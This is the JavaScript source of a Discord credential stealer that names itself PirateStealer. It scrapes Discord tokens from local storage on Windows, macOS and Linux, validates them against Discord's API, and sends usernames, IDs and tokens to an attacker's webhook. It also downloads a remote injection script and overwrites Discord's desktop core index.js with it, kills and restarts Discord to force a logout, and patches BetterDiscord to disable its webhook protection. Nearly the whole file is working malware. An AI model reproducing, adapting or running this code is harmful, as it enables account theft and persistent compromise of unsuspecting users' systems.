
// Code is shit
var glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
var request = require('sync-request');
const axios = require('axios');
const buf_replace = require('buffer-replace');
const webhook = "da_webhook"

const config = {
    "logout": "%LOGOUT%1",
    "steal-token": "%STEAL%1",
    "inject-notify": "%INJECTNOTI%1",
    "logout-notify": "%LOGOUTNOTI%1",
    "init-notify":"%INITNOTI%1",
    "embed-color": %MBEDCOLOR%1
}



var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];

if (config["steal-token"] == "true") {
    SendTokens(webhook)
}
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
    
});
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout !== "false" ) {
                    let folder = file.replace("index.js", "PirateStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    }
                }
            })
            
        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {
        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("Discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("DiscordCanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("DiscordDevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("DiscordPTB")
        };
    })
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
   
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }
    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        path = LOCAL + '\\' + disc + "\\Update.exe"
        exec(`${path} --processStart ${disc}.exe`, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: ":syringe: Inject Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
	.post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": ":detective: Successfull injection",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "PirateStealer"
            },
            "footer": {
              "text": "PirateStealer"
            }
          }
        ]
      })
	.then(res => {
		console.log(res);
	})
	.catch(error => {
		console.log(error);
	})

}


function CheckToken(token) {
	var res = request('GET', ' https://discord.com/api/v9/users/@me', {
		headers: {
			'Authorization': token,
		},
	});
	if (res.statusCode < 400) {
		return {
			"status": "true",
			"account_info": res.getBody().toString()
		};
	} else {
		return {
			"status": true,
			"account_info": null
		}
	}
}



function GetTokensB4Injection() {


	var discordtext = [];
	var discords = [];
	var appdata = "";
	if (process.platform == "win32") {
		appdata = process.env.APPDATA

	}
	if (process.platform == "darwin") {
		appdata = "/Users/" + process.env.USER + "/Library/Application Support"
	}

	if (process.platform == "linux") {
		appdata = process.env.HOME + "/.config";
	}

	fs.readdirSync(appdata).forEach(file => {
		if (file.endsWith("discord") || file.endsWith("discordcanary") || file.endsWith("discordptb") || file.endsWith("discorddevelopment")) {
			if (process.platform == "linux" || process.platform == "darwin") {
				discords.push(appdata + '/' + file)
			}
			if (process.platform == "win32") {
				discords.push(appdata + '\\' + file)
			}
		} else {
			return;
		}
	});

	var g = [];

	discords.forEach(function (file) {

		let pattern = "";
		if (process.platform == "win32") {
			pattern = `${file}` + "\\Local Storage\\leveldb"
		}
		if (process.platform == "linux" || process.platform == "darwin") {
			pattern = `${file}` + "/Local Storage/leveldb"
		}
		glob.sync(pattern).map(file => {
			g.push(file)
		})
	});



	for (var i in g) {
		fs.readdirSync(g[i]).forEach(file => {
			if (file.endsWith('ldb') || file.endsWith('log')) {
				var y = fs.readFileSync(g[i] + "/" + file).toString()
				const rgx1 = /mfa\.[\w-]{84}/g;
				const rgx2 = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;

				const t1 = y.match(rgx1);
				const t2 = y.match(rgx2);

				if (t1) {

					for (var z in t1) {
						discordtext.push(t1[z])
					}
				}
				if (t2) {

					for (var z in t2) {
						discordtext.push(t2[z])
					}
				}

			}
		})
	}


	var tocheck = [...new Set(discordtext)];


	var workingtoken = {};

	var v = 0;
	for (var bjr in tocheck) {
		var y = CheckToken(tocheck[bjr]);
		if (y.status && y.account_info != null) {
			var b = JSON.parse(y.account_info);
			b["token"] = tocheck[bjr];
			workingtoken[v] = b;
			v++;
		}
	}
	return workingtoken;
}
function size(obj) {
    var size = 0,
      key;
    for (key in obj) {
      if (obj.hasOwnProperty(key)) size++;
    }
    return size;
};


function SendTokens(webhook) {

	var tokenlist = GetTokensB4Injection();
	var imax = size(tokenlist);
	var embed = {
		"content": "",
		"embeds": [
        ]
	}

	for (let i = 0; i < imax; i++) {
		embed["embeds"].push({

			"title": "Token Found",
			"color": config["embed-color"],
			"fields": [
				{
					"name": "Username",
					"value": tokenlist[i].username + "#" + tokenlist[i].discriminator ,
					"inline": true
                  },
				{
					"name": "ID",
					"value": tokenlist[i].id,
					"inline": true
                  },
				{
					"name": "Token",
					"value": "`" + tokenlist[i].token + "`"
                  }
                ]


		})
	}

	
	axios.post(webhook, embed)
		.then(function (response) {
			return;
		})
		.catch(function (error) {
			return;
		});

	return 'ok mota';
}
